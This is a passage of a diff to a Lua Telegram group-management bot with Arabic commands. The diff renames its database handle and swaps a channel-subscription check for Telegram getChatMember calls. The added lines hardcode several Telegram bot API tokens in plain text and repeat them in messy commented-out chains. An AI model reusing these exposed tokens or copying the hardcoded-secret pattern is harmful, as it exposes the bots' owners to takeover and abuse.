+if res:match('"status":"left"') or res:match('USER_ID_INVALID') or res:match('kicked') then --@MohaMeDfreer.MohaMeD ~= true then
+send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @MohaMeD ⚜️\n', 1, 'html')   
 return false end
 function promote_by_reply(extra, result, success)
-database:srem('MohaMeD:'..bot_id..'creatorbasic:'..msg.chat_id_, result.sender_user_id_)
+datahmade:srem('MohaMeD:'..bot_id..'creatorbasic:'..msg.chat_id_, result.sender_user_id_)
 tsX000("prore",msg,'تم تنزيلة منشئ اساسي من البوت')
 end
 getMessage(msg.chat_id_, msg.reply_to_message_id_,promote_by_reply)
 return false
 end
 if text and text:match("^تنزيل منشئ اساسي @(.*)$") then
-local url , res = http.request('http://MohaMeD.ml/joinch/?id='..msg.sender_user_id_..'')
-data = JSON.decode(url)
-if data.Ch_Member.MohaMeD ~= true then
-send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @M1_m2s ⚜️\n', 1, 'html')   
+local res = https.request('https://api.telegram.org/bot811517309:AAHXqID4uTs4NOfcRH3WHIBd6pf353sxNmg/getChatMember?chat_id=@MohaMeD&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot811517309:AAEBec_wk81nh6and9t2vp8znFFTbLclp94/getChatMember?chat_id=@MohaMeD&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot811517309:AAEBec_wk81nh6and9t2vp8znFFTbLclp94/getChatMember?chat_id=@MohaMeD&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot666998640:AAEOwMMQU8pzy60wLF23EiXjbfVsI6jrQAk/getChatMember?chat_id=@MohaMeD&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot827950325:AAGjaAxIwupH9vWLvB3JIRZRGFHhSVZsM9Y/getChatMember?chat_id=@MohaMeD&user_id='..msg.sender_user_id_)--ttps.request('https://teamstorm.tk/joinch/?id='..msg.sender_user_id_..'')
+-- @MohaMeDFreeON.decode(url)
+if res:match('"status":"left"') or res:match('USER_ID_INVALID') or res:match('kicked') then --@MohaMeDfreer.MohaMeD ~= true then
+send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @MohaMeD ⚜️\n', 1, 'html')   
 return false end
 local apmd = {string.match(text, "^(تنزيل منشئ اساسي) @(.*)$")}
 function promote_by_username(extra, result, success)
 if result.id_ then
-database:srem('MohaMeD:'..bot_id..'creatorbasic:'..msg.chat_id_, result.id_)
+datahmade:srem('MohaMeD:'..bot_id..'creatorbasic:'..msg.chat_id_, result.id_)
 texts = '👤┇العضو ~⪼ ['..result.title_..'](t.me/'..(apmd[2] or 'MohaMeDTEAM')..')\n┇ تم تنزيلة منشئ اساسي من البوت  '
 else
 texts = '✖┇خطاء'
@@ -3534,37 +3467,37 @@ resolve_username(apmd[2],promote_by_username)
 return false
 end
 if text and text:match("^تنزيل منشئ اساسي (%d+)$") then
-local url , res = http.request('http://MohaMeD.ml/joinch/?id='..msg.sender_user_id_..'')
-data = JSON.decode(url)
-if data.Ch_Member.MohaMeD ~= true then
-send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @M1_m2s ⚜️\n', 1, 'html')   
+local res = https.request('https://api.telegram.org/bot811517309:AAHXqID4uTs4NOfcRH3WHIBd6pf353sxNmg/getChatMember?chat_id=@MohaMeD&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot811517309:AAEBec_wk81nh6and9t2vp8znFFTbLclp94/getChatMember?chat_id=@MohaMeD&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot811517309:AAEBec_wk81nh6and9t2vp8znFFTbLclp94/getChatMember?chat_id=@MohaMeD&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot666998640:AAEOwMMQU8pzy60wLF23EiXjbfVsI6jrQAk/getChatMember?chat_id=@MohaMeD&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot827950325:AAGjaAxIwupH9vWLvB3JIRZRGFHhSVZsM9Y/getChatMember?chat_id=@MohaMeD&user_id='..msg.sender_user_id_)--ttps.request('https://teamstorm.tk/joinch/?id='..msg.sender_user_id_..'')
+-- @MohaMeDFreeON.decode(url)
+if res:match('"status":"left"') or res:match('USER_ID_INVALID') or res:match('kicked') then --@MohaMeDfreer.MohaMeD ~= true then
+send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @MohaMeD ⚜️\n', 1, 'html')   
 return false end
 local apmd = {string.match(text, "^(تنزيل منشئ اساسي) (%d+)$")}
-database:srem('MohaMeD:'..bot_id..'creatorbasic:'..msg.chat_id_, apmd[2])
+datahmade:srem('MohaMeD:'..bot_id..'creatorbasic:'..msg.chat_id_, apmd[2])
 tsX000(apmd[2],msg,"تم تنزيلة منشئ اساسي من البوت")
 return false
 end
 ------------------------------------------------------------------------
 if (text == ("عدد الكروبات") or text ==("الاحصائيات")) then
-local gps = database:scard('MohaMeD:'..bot_id.."groups") or 0
-local user = database:scard('MohaMeD:'..bot_id.."userss") or 0
-local gps2 = database:scard("thsake:gog"..bot_id) or 0
-local gps9 = database:scard("thsake:good"..bot_id..os.date("%d")) or 0
-local gps3 = database:scard('MohaMeD:'..bot_id..'pro:groups') or 0
+local gps = datahmade:scard('MohaMeD:'..bot_id.."groups") or 0
+local user = datahmade:scard('MohaMeD:'..bot_id.."userss") or 0
+local gps2 = datahmade:scard("MohaMeDe:gog"..bot_id) or 0
+local gps9 = datahmade:scard("MohaMeDe:good"..bot_id..os.date("%d")) or 0
+local gps3 = datahmade:scard('MohaMeD:'..bot_id..'pro:groups') or 0
 send(msg.chat_id_, msg.id_, 1, '• المجموعات :\n📊┇عدد الكروبات الكلي ~⪼  *{'..gps..'}*\n🔋┇عدد الكروبات المفعله ~⪼  *{'..gps2..'}*\n🔌┇عدد الكروبات الغير مفعله ~⪼  *{'..(gps - gps2)..'}*\n💡┇عدد الكروبات المدفوعه ~⪼  *{'..(gps3)..'}*\n⏱┇عدد الكروبات المتفاعله اليوم ~⪼  *{'..(gps9)..'}*\n\n• الاعضاء :\n👥┇ عدد اعضاء الخاص : {`'..user..'`}', 1, 'md')
 end
 ------------------------------------------------------------------------
 if text and text:match("^وضع وقت (%d+)$") then
 local a = {string.match(text, "^(وضع وقت) (%d+)$")}
 local time = a[2] * day
-database:setex( 'MohaMeD:'..bot_id.."charge:"..msg.chat_id_,time,true)
-database:set( 'MohaMeD:'..bot_id.."enable:"..msg.chat_id_,true)
+datahmade:setex( 'MohaMeD:'..bot_id.."charge:"..msg.chat_id_,time,true)
+datahmade:set( 'MohaMeD:'..bot_id.."enable:"..msg.chat_id_,true)
 send(msg.chat_id_, msg.id_, 1, '🔘┇تم وضع وقت انتهاء البوت *{'..a[2]..'}* يوم', 1, 'md')
 end--
 ------------------------------------------------------------------------
 if text and text:match("^وقت المجموعه (-%d+)$") then
 local txt = {string.match(text, "^(وقت المجموعه) (-%d+)$")}
-local ex = database:ttl( 'MohaMeD:'..bot_id.."charge:"..txt[2])
+local ex = datahmade:ttl( 'MohaMeD:'..bot_id.."charge:"..txt[2])
 if ex == -1 then
 send(msg.chat_id_, msg.id_, 1, '🔘┇وقت المجموعه لا نهائي', 1, 'md')
 else
@@ -3574,83 +3507,83 @@ end
 end
 ------------------------------------------------------------------------
 if text and text:match("^مغادره (-%d+)$")  then
-local url , res = http.request('http://MohaMeD.ml/joinch/?id='..msg.sender_user_id_..'')
-data = JSON.decode(url)
-if data.Ch_Member.MohaMeD ~= true then
-send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @M1_m2s ⚜️\n', 1, 'html')   
+local res = https.request('https://api.telegram.org/bot811517309:AAHXqID4uTs4NOfcRH3WHIBd6pf353sxNmg/getChatMember?chat_id=@MohaMeD&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot811517309:AAEBec_wk81nh6and9t2vp8znFFTbLclp94/getChatMember?chat_id=@MohaMeD&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot811517309:AAEBec_wk81nh6and9t2vp8znFFTbLclp94/getChatMember?chat_id=@MohaMeD&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot666998640:AAEOwMMQU8pzy60wLF23EiXjbfVsI6jrQAk/getChatMember?chat_id=@MohaMeD&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot827950325:AAGjaAxIwupH9vWLvB3JIRZRGFHhSVZsM9Y/getChatMember?chat_id=@MohaMeD&user_id='..msg.sender_user_id_)--ttps.request('https://teamstorm.tk/joinch/?id='..msg.sender_user_id_..'')
+-- @MohaMeDFreeON.decode(url)
+if res:match('"status":"left"') or res:match('USER_ID_INVALID') or res:match('kicked') then --@MohaMeDfreer.MohaMeD ~= true then
+send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @MohaMeD ⚜️\n', 1, 'html')   
 return false end
 local txt = {string.match(text, "^(مغادره) (-%d+)$")}
 send(msg.chat_id_, msg.id_, 1, '📮┇المجموعه {'..txt[2]..'} تم الخروج منها', 1, 'md')
-database:del("thsake:gog"..bot_id,txt[2])
+datahmade:del("MohaMeDe:gog"..bot_id,txt[2])
 chat_leave(txt[2], bot_id)
 end
 ------------------------------------------------------------------------
 if text and text:match('^المده1 (-%d+)$')  then
-local url , res = http.request('http://MohaMeD.ml/joinch/?id='..msg.sender_user_id_..'')
-data = JSON.decode(url)
-if data.Ch_Member.MohaMeD ~= true then
-send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @M1_m2s ⚜️\n', 1, 'html')   
+local res = https.request('https://api.telegram.org/bot811517309:AAHXqID4uTs4NOfcRH3WHIBd6pf353sxNmg/getChatMember?chat_id=@MohaMeD&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot811517309:AAEBec_wk81nh6and9t2vp8znFFTbLclp94/getChatMember?chat_id=@MohaMeD&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot811517309:AAEBec_wk81nh6and9t2vp8znFFTbLclp94/getChatMember?chat_id=@MohaMeD&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot666998640:AAEOwMMQU8pzy60wLF23EiXjbfVsI6jrQAk/getChatMember?chat_id=@MohaMeD&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot827950325:AAGjaAxIwupH9vWLvB3JIRZRGFHhSVZsM9Y/getChatMember?chat_id=@MohaMeD&user_id='..msg.sender_user_id_)--ttps.request('https://teamstorm.tk/joinch/?id='..msg.sender_user_id_..'')
+-- @MohaMeDFreeON.decode(url)
+if res:match('"status":"left"') or res:match('USER_ID_INVALID') or res:match('kicked') then --@MohaMeDfreer.MohaMeD ~= true then
+send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @MohaMeD ⚜️\n', 1, 'html')   
 return false end
 local txt = {string.match(text, "^(المده1) (-%d+)$")}
-local keko_info = nil
-function keko333(extra,result,success)
-keko_info = '@'..(result.username_ or 'لا يوجد')..''
+local ahmad_info = nil
+function ahmad333(extra,result,success)
+ahmad_info = '@'..(result.username_ or 'لا يوجد')..''
 local timeplan1 = 2592000
-database:setex( 'MohaMeD:'..bot_id.."charge:"..txt[2],timeplan1,true)
+datahmade:setex( 'MohaMeD:'..bot_id.."charge:"..txt[2],timeplan1,true)
 send(msg.chat_id_, msg.id_, 1, '☑┇المجموعه ('..txt[2]..') تم اعادة تفعيلها المدة 30 يوم', 1, 'md')
 send(txt[2], 0, 1, '☑┇تم تفعيل مدة المجموعه 30 يوم', 1, 'md')
 for k,v in pairs(sudo_users) do
-function thsake_info(k1,k2)
-send(v, 0, 1, "🔘┇قام بتفعيل مجموعه المده كانت 30 يوم \n🎫┇ايدي المطور ~⪼ ("..msg.sender_user_id_..")\n📜┇معرف المطور ~⪼ "..keko_info.."\n🌐┇معلومات المجموعه \n\n🎫┇ايدي المجموعه ~⪼ ("..msg.chat_id_..")\nⓂ┇اسم المجموعه ~⪼ ("..k2.title_..")" , 1, 'md')
+function MohaMeDe_info(k1,k2)
+send(v, 0, 1, "🔘┇قام بتفعيل مجموعه المده كانت 30 يوم \n🎫┇ايدي المطور ~⪼ ("..msg.sender_user_id_..")\n📜┇معرف المطور ~⪼ "..ahmad_info.."\n🌐┇معلومات المجموعه \n\n🎫┇ايدي المجموعه ~⪼ ("..msg.chat_id_..")\nⓂ┇اسم المجموعه ~⪼ ("..k2.title_..")" , 1, 'md')
 end
-openChat(msg.chat_id_,thsake_info)
+openChat(msg.chat_id_,MohaMeDe_info)
 end
-database:set( 'MohaMeD:'..bot_id.."enable:"..txt[2],true)
+datahmade:set( 'MohaMeD:'..bot_id.."enable:"..txt[2],true)
 end
-getUser(msg.sender_user_id_, keko333)
+getUser(msg.sender_user_id_, ahmad333)
 end
 ------------------------------------------------------------------------
 if text and text:match('^المده2 (-%d+)$')  then
 local txt = {string.match(text, "^(المده2) (-%d+)$")}
-local keko_info = nil
-function keko333(extra,result,success)
-keko_info = '@'..(result.username_ or 'لا يوجد')..''
+local ahmad_info = nil
+function ahmad333(extra,result,success)
+ahmad_info = '@'..(result.username_ or 'لا يوجد')..''
 local timeplan2 = 7776000
-database:setex( 'MohaMeD:'..bot_id.."charge:"..txt[2],timeplan2,true)
+datahmade:setex( 'MohaMeD:'..bot_id.."charge:"..txt[2],timeplan2,true)
 send(msg.chat_id_, msg.id_, 1, '☑┇المجموعه ('..txt[2]..') تم اعادة تفعيلها المدة 90 يوم', 1, 'md')
 send(txt[2], 0, 1, '☑┇تم تفعيل مدة المجموعه 90 يوم', 1, 'md')
 for k,v in pairs(sudo_users) do
-function thsake_info(k1,k2)
-send(v, 0, 1, "🔘┇قام بتفعيل مجموعه المده كانت 90 يوم \n🎫┇ايدي المطور ~⪼ ("..msg.sender_user_id_..")\n📜┇معرف المطور ~⪼ "..keko_info.."\n🌐┇معلومات المجموعه \n\n🎫┇ايدي المجموعه ~⪼ ("..msg.chat_id_..")\nⓂ┇اسم المجموعه ~⪼ ("..k2.title_..")" , 1, 'md')
+function MohaMeDe_info(k1,k2)
+send(v, 0, 1, "🔘┇قام بتفعيل مجموعه المده كانت 90 يوم \n🎫┇ايدي المطور ~⪼ ("..msg.sender_user_id_..")\n📜┇معرف المطور ~⪼ "..ahmad_info.."\n🌐┇معلومات المجموعه \n\n🎫┇ايدي المجموعه ~⪼ ("..msg.chat_id_..")\nⓂ┇اسم المجموعه ~⪼ ("..k2.title_..")" , 1, 'md')
 end
-openChat(msg.chat_id_,thsake_info)
+openChat(msg.chat_id_,MohaMeDe_info)
 end
-database:set( 'MohaMeD:'..bot_id.."enable:"..txt[2],true)
+datahmade:set( 'MohaMeD:'..bot_id.."enable:"..txt[2],true)
 end
-getUser(msg.sender_user_id_, keko333)
+getUser(msg.sender_user_id_, ahmad333)
 end
 ------------------------------------------------------------------------
 if text and text:match('^المده3 (-%d+)$')  then
 local txt = {string.match(text, "^(المده3) (-%d+)$")}
-local keko_info = nil
-function keko333(extra,result,success)
-keko_info = '@'..(result.username_ or 'لا يوجد')..''
-database:set( 'MohaMeD:'..bot_id.."charge:"..txt[2],true)
+local ahmad_info = nil
+function ahmad333(extra,result,success)
+ahmad_info = '@'..(result.username_ or 'لا يوجد')..''
+datahmade:set( 'MohaMeD:'..bot_id.."charge:"..txt[2],true)
 send(msg.chat_id_, msg.id_, 1, '☑┇المجموعه ('..txt[2]..') تم اعادة تفعيلها المدة لا نهائية', 1, 'md')
 send(txt[2], 0, 1, '☑┇تم تفعيل مدة المجموعه لا نهائية', 1, 'md')
 for k,v in pairs(sudo_users) do
-function thsake_info(k1,k2)
-send(v, 0, 1, "🔘┇قام بتفعيل مجموعه المده كانت لا نهائية \n🎫┇ايدي المطور ~⪼ ("..msg.sender_user_id_..")\n📜┇معرف المطور ~⪼ "..keko_info.."\n🌐┇معلومات المجموعه \n\n🎫┇ايدي المجموعه ~⪼ ("..msg.chat_id_..")\nⓂ┇اسم المجموعه ~⪼ ("..k2.title_..")" , 1, 'md')
+function MohaMeDe_info(k1,k2)
+send(v, 0, 1, "🔘┇قام بتفعيل مجموعه المده كانت لا نهائية \n🎫┇ايدي المطور ~⪼ ("..msg.sender_user_id_..")\n📜┇معرف المطور ~⪼ "..ahmad_info.."\n🌐┇معلومات المجموعه \n\n🎫┇ايدي المجموعه ~⪼ ("..msg.chat_id_..")\nⓂ┇اسم المجموعه ~⪼ ("..k2.title_..")" , 1, 'md')
 end
-openChat(msg.chat_id_,thsake_info)
+openChat(msg.chat_id_,MohaMeDe_info)
 end
-database:set( 'MohaMeD:'..bot_id.."enable:"..txt[2],true)
+datahmade:set( 'MohaMeD:'..bot_id.."enable:"..txt[2],true)
 end
-getUser(msg.sender_user_id_, keko333)
+getUser(msg.sender_user_id_, ahmad333)
 end
 ------------------------------------------------------------------------
 if text == 'المنشئين الاساسين' then
-local list = database:smembers('MohaMeD:'..bot_id..'creatorbasic:'..msg.chat_id_)
+local list = datahmade:smembers('MohaMeD:'..bot_id..'creatorbasic:'..msg.chat_id_)
 if #list == 0 then
 text = "❗️┇ لا يوجد منشئين اساسين "
 send(msg.chat_id_, msg.id_, 1, text, 1, 'html')
@@ -3658,7 +3591,7 @@ return false
 end
 text = "🛅┇قائمة المنشئين الاساسيين ،\n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ \n"
 for k,v in pairs(list) do
-local user_info = database:hgetall('MohaMeD:'..bot_id..'user:'..v)
+local user_info = datahmade:hgetall('MohaMeD:'..bot_id..'user:'..v)
 if user_info and user_info.username then
 local username = user_info.username
 text = text.."<b>|"..k.."|</b>~⪼(@"..username..")\n"
@@ -3672,19 +3605,19 @@ end
 
 end -- if is_sudo(msg) then
 ------------------------------------------------------------------------
-if is_devabas(msg) or is_sudo(msg) or is_creatorbasic(msg) or is_creatorbasicc(msg.chat_id_,msg.sender_user_id_) and ChekAdd(msg.chat_id_) == true then    
+if is_devahmad(msg) or is_sudo(msg) or is_creatorbasic(msg) or is_creatorbasicc(msg.chat_id_,msg.sender_user_id_) and ChekAdd(msg.chat_id_) == true then    
 if text == "رفع منشئ" and msg.reply_to_message_id_ then
-local url , res = http.request('http://MohaMeD.ml/joinch/?id='..msg.sender_user_id_..'')
-data = JSON.decode(url)
-if data.Ch_Member.MohaMeD ~= true then
-send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @M1_m2s ⚜️\n', 1, 'html')   
+local res = https.request('https://api.telegram.org/bot811517309:AAHXqID4uTs4NOfcRH3WHIBd6pf353sxNmg/getChatMember?chat_id=@MohaMeD&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot811517309:AAEBec_wk81nh6and9t2vp8znFFTbLclp94/getChatMember?chat_id=@MohaMeD&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot811517309:AAEBec_wk81nh6and9t2vp8znFFTbLclp94/getChatMember?chat_id=@MohaMeD&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot666998640:AAEOwMMQU8pzy60wLF23EiXjbfVsI6jrQAk/getChatMember?chat_id=@MohaMeD&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot827950325:AAGjaAxIwupH9vWLvB3JIRZRGFHhSVZsM9Y/getChatMember?chat_id=@MohaMeD&user_id='..msg.sender_user_id_)--ttps.request('https://teamstorm.tk/joinch/?id='..msg.sender_user_id_..'')
+-- @MohaMeDFreeON.decode(url)
+if res:match('"status":"left"') or res:match('USER_ID_INVALID') or res:match('kicked') then --@MohaMeDfreer.MohaMeD ~= true then
+send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @MohaMeD ⚜️\n', 1, 'html')   
 return false end
 function setcreator_by_reply(extra, result, success)
 local hash =  'MohaMeD:'..bot_id..'creator:'..msg.chat_id_
-if database:sismember(hash, result.sender_user_id_) then
+if datahmade:sismember(hash, result.sender_user_id_) then
 tsX000("prore",msg,"🔖┇تم بالفعل رفعة منشئ  في البوت")
 else
-database:sadd(hash, result.sender_user_id_)
+datahmade:sadd(hash, result.sender_user_id_)
 tsX000("prore",msg,"🔖┇تم رفعة منشئ  في البوت")
 end
 end
@@ -3692,10 +3625,10 @@ getMessage(msg.chat_id_, msg.reply_to_message_id_,setcreator_by_reply)
 end
 if text and text:match("^رفع منشئ @(.*)$") then
 local apow = {string.match(text, "^(رفع منشئ) @(.*)$")}
-local url , res = http.request('http://MohaMeD.ml/joinch/?id='..msg.sender_user_id_..'')
-data = JSON.decode(url)
-if data.Ch_Member.MohaMeD ~= true then
-send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @M1_m2s ⚜️\n', 1, 'html')   
+local res = https.request('https://api.telegram.org/bot811517309:AAHXqID4uTs4NOfcRH3WHIBd6pf353sxNmg/getChatMember?chat_id=@MohaMeD&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot811517309:AAEBec_wk81nh6and9t2vp8znFFTbLclp94/getChatMember?chat_id=@MohaMeD&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot811517309:AAEBec_wk81nh6and9t2vp8znFFTbLclp94/getChatMember?chat_id=@MohaMeD&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot666998640:AAEOwMMQU8pzy60wLF23EiXjbfVsI6jrQAk/getChatMember?chat_id=@MohaMeD&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot827950325:AAGjaAxIwupH9vWLvB3JIRZRGFHhSVZsM9Y/getChatMember?chat_id=@MohaMeD&user_id='..msg.sender_user_id_)--ttps.request('https://teamstorm.tk/joinch/?id='..msg.sender_user_id_..'')
+-- @MohaMeDFreeON.decode(url)
+if res:match('"status":"left"') or res:match('USER_ID_INVALID') or res:match('kicked') then --@MohaMeDfreer.MohaMeD ~= true then
+send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @MohaMeD ⚜️\n', 1, 'html')   
 return false end
 function setcreator_by_username(extra, result, success)
 if result.id_ then
@@ -3703,7 +3636,7 @@ if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
 SendText(msg.chat_id_,msg.id_,"*📮┇ هاذا معرف قناة \n*")   
 return false 
 end      
-database:sadd('MohaMeD:'..bot_id..'creator:'..msg.chat_id_, result.id_)
+datahmade:sadd('MohaMeD:'..bot_id..'creator:'..msg.chat_id_, result.id_)
 texts = '👤┇العضو ~⪼ ['..result.title_..'](t.me/'..(apow[2] or 'MohaMeDTEAM')..')\n🔖┇تم رفعة منشئ  في البوت'
 else
 texts = '✖┇خطاء'
@@ -3715,21 +3648,21 @@ end
 ------------------------------------------------------------------------
 if text and text:match("^رفع منشئ (%d+)$") then
 local apow = {string.match(text, "^(رفع منشئ) (%d+)$")}
-local url , res = http.request('http://MohaMeD.ml/joinch/?id='..msg.sender_user_id_..'')
-data = JSON.decode(url)
-if data.Ch_Member.MohaMeD ~= true then
-send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @M1_m2s ⚜️\n', 1, 'html')   
+local res = https.request('https://api.telegram.org/bot811517309:AAHXqID4uTs4NOfcRH3WHIBd6pf353sxNmg/getChatMember?chat_id=@MohaMeD&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot811517309:AAEBec_wk81nh6and9t2vp8znFFTbLclp94/getChatMember?chat_id=@MohaMeD&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot811517309:AAEBec_wk81nh6and9t2vp8znFFTbLclp94/getChatMember?chat_id=@MohaMeD&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot666998640:AAEOwMMQU8pzy60wLF23EiXjbfVsI6jrQAk/getChatMember?chat_id=@MohaMeD&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot827950325:AAGjaAxIwupH9vWLvB3JIRZRGFHhSVZsM9Y/getChatMember?chat_id=@MohaMeD&user_id='..msg.sender_user_id_)--ttps.request('https://teamstorm.tk/joinch/?id='..msg.sender_user_id_..'')
+-- @MohaMeDFreeON.decode(url)
+if res:match('"status":"left"') or res:match('USER_ID_INVALID') or res:match('kicked') then --@MohaMeDfreer.MohaMeD ~= true then
+send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @MohaMeD ⚜️\n', 1, 'html')   
 return false end
-database:sadd('MohaMeD:'..bot_id..'creator:'..msg.chat_id_, apow[2])
+datahmade:sadd('MohaMeD:'..bot_id..'creator:'..msg.chat_id_, apow[2])
 tsX000(apow[2],msg,"🔖┇تم رفعة منشئ  في البوت")
 end
 if text and text:match("^تنزيل منشئ$") and msg.reply_to_message_id_ then
 function decreator_by_reply(extra, result, success)
 local hash =  'MohaMeD:'..bot_id..'creator:'..msg.chat_id_
-if not database:sismember(hash, result.sender_user_id_) then
+if not datahmade:sismember(hash, result.sender_user_id_) then
 tsX000("prore",msg,"🔰┇بالفعل تم تنزيله من منشئين المجموعه")
 else
-database:srem(hash, result.sender_user_id_)
+datahmade:srem(hash, result.sender_user_id_)
 tsX000("prore",msg,"🔰┇تم تنزيله من منشئين المجموعه")
 end
 end
@@ -3741,7 +3674,7 @@ local apow = {string.match(text, "^(تنزيل منشئ) @(.*)$")}
 local hash =  'MohaMeD:'..bot_id..'creator:'..msg.chat_id_
 function remcreator_by_username(extra, result, success)
 if result.id_ then
-database:srem(hash, result.id_)
+datahmade:srem(hash, result.id_)
 texts = '👤┇العضو ~⪼ ['..result.title_..'](t.me/'..(apow[2] or 'MohaMeDTEAM')..')\n🔰┇تم تنزيله من منشئين المجموعه'
 else
 texts = '✖┇خطاء'
@@ -3754,22 +3687,22 @@ end
 if text and text:match("^تنزيل منشئ (%d+)$") then
 local hash =  'MohaMeD:'..bot_id..'creator:'..msg.chat_id_
 local apow = {string.match(text, "^(تنزيل منشئ) (%d+)$")}
-database:srem(hash, apow[2])
+datahmade:srem(hash, apow[2])
 tsX000(apow[2],msg,"🔰┇تم تنزيله من منشئين المجموعه")
 end--
 ------------------------------------------------------------------------
 if text == 'مسح المنشئين' then
-database:del('MohaMeD:'..bot_id..'creator:'..msg.chat_id_)
+datahmade:del('MohaMeD:'..bot_id..'creator:'..msg.chat_id_)
 texts = '✖┇ تم مسح المنشئين '
 send(msg.chat_id_, msg.id_, 1, texts, 1, 'md')
 end
 
 if text == ("المنشئين") then
 local hash =   'MohaMeD:'..bot_id..'creator:'..msg.chat_id_
-local list = database:smembers(hash)
+local list = datahmade:smembers(hash)
 text = "🛅┇قائمة المنشئين  ،\n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ \n"
 for k,v in pairs(list) do
-local user_info = database:hgetall('MohaMeD:'..bot_id..'user:'..v)
+local user_info = datahmade:hgetall('MohaMeD:'..bot_id..'user:'..v)
 if user_info and user_info.username then
 local username = user_info.username
 text = text.."<b>|"..k.."|</b>~⪼(@"..username..")\n"
@@ -3789,20 +3722,20 @@ end
 
 if text and text:match("^رفع ادمن بالكروب (%d+)$") then
 local apmd = {string.match(text, "^(رفع ادمن بالكروب) (%d+)$")}
-local url , res = http.request('http://MohaMeD.ml/joinch/?id='..msg.sender_user_id_..'')
-data = JSON.decode(url)
-if data.Ch_Member.MohaMeD ~= true then
-send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @M1_m2s ⚜️\n', 1, 'html')   
